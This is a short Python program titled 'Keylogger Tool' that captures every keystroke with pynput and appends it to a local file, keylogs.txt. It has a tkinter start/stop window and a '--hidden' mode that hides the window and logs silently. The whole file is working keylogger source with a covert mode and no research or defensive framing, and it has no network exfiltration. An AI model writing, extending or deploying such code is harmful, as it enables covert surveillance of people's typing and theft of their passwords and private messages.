import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import os
import threading
import sys

# Initialize global variables
keylogger_active = False
log_file = "keylogs.txt"
hidden_mode = False

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f'[{key}] ')
    except Exception as e:
        print(f"Error writing to log file: {str(e)}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    global keylogger_active
    if keylogger_active:
        messagebox.showwarning("Warning", "Keylogger is already running.")
        return
    keylogger_active = True
    keylogger_thread = threading.Thread(target=keylogger_main)
    keylogger_thread.daemon = True
    keylogger_thread.start()
    if not hidden_mode:
        status_label.config(text="Status: Keylogger Running")

def stop_keylogger():
    global keylogger_active
    if not keylogger_active:
        messagebox.showwarning("Warning", "Keylogger is not running.")
        return
    keylogger_active = False
    if not hidden_mode:
        status_label.config(text="Status: Keylogger Stopped")

def keylogger_main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def create_gui():
    # Set up GUI
    global root
    root = tk.Tk()
    root.title("Keylogger Tool")
    root.geometry("400x150")

    start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger, bg="green", fg="white", font=("Helvetica", 12, "bold"))
    start_button.pack(pady=10)

    stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, bg="red", fg="white", font=("Helvetica", 12, "bold"))
    stop_button.pack(pady=10)

    global status_label
    status_label = tk.Label(root, text="Status: Idle")
    status_label.pack(pady=20)

    root.mainloop()

# Check if hidden mode argument is provided
if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
    hidden_mode = True
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    keylogger_main()  # Start keylogger in hidden mode
else:
    create_gui()  # Show GUI if not in hidden mode
